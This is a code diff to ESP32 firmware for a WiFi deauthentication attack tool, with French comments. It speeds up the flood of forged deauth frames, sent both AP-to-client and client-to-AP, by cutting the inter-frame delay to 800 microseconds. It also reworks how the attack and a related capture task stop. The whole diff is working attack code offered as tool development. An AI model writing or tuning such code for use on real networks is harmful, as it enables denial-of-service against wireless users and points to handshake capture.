@@ -1,4 +1,5 @@
 #include "classic_deauth.h"
+#include "esp_rom_sys.h"   // esp_rom_delay_us
 
 static const char* TAG = "CLASSIC_DEAUTH";
 
@@ -43,16 +44,16 @@ void send_deauth_packets(const uint8_t *ap_mac, const uint8_t *client_mac) {
             // ===== AP -> Client =====
             build_deauth_packet(packet, client_mac, ap_mac, ap_mac, reason);
             if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
-            vTaskDelay(pdMS_TO_TICKS(5));
+            esp_rom_delay_us(800);   // gap fin (indépendant du tick FreeRTOS)
 
             // ===== Client -> AP =====
             build_deauth_packet(packet, ap_mac, client_mac, ap_mac, reason);
             if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
-            vTaskDelay(pdMS_TO_TICKS(5));
+            esp_rom_delay_us(800);
         }
 
-        // Inter-burst
-        vTaskDelay(pdMS_TO_TICKS(50));
+        // Inter-burst : yield pour nourrir le watchdog et la pile BLE
+        vTaskDelay(pdMS_TO_TICKS(10));
 
         if ((total_count + 1) % 10 == 0) {
             unsigned long elapsed = (esp_timer_get_time() / 1000000) - start;
@@ -127,20 +128,26 @@ void start_deauth_attack(char *target, char *ap, int channel) {
 void stop_deauth_attack() {
     if(!deauthActive) return;
 
-    deauthActive = false;
+    // Arrêt COOPÉRATIF : on lève les drapeaux et on laisse la tâche (classic,
+    // steal ou test) sortir de sa boucle et se nettoyer elle-même
+    // (restore_wifi_state + handle=NULL + vTaskDelete(NULL)). On ne tue JAMAIS
+    // la tâche en plein esp_wifi_80211_tx (ce qui corrompait le driver WiFi).
+    deauthActive  = false;
+    captureActive = false;
 
-    ESP_LOGI(TAG, "Stopping deauth attack...");
-    
-    // Wait for task to finish (max 2 seconds)
+    ESP_LOGI(TAG, "Stopping attack (cooperative)...");
+
+    // Attendre la sortie propre (jusqu'à 5 s)
     int wait_count = 0;
-    while (deauth_get_task_handle() != NULL && wait_count < 20) {
+    while (deauth_get_task_handle() != NULL && wait_count < 50) {
         vTaskDelay(pdMS_TO_TICKS(100));
         wait_count++;
     }
-    
-    // Force delete if still running
+
+    // Filet de sécurité : si la tâche est réellement bloquée, dernier recours
     TaskHandle_t handle = deauth_get_task_handle();
     if (handle != NULL) {
+        ESP_LOGW(TAG, "Task did not exit in time, forcing cleanup");
         vTaskDelete(handle);
         deauth_set_task_handle(NULL);
         restore_wifi_state();
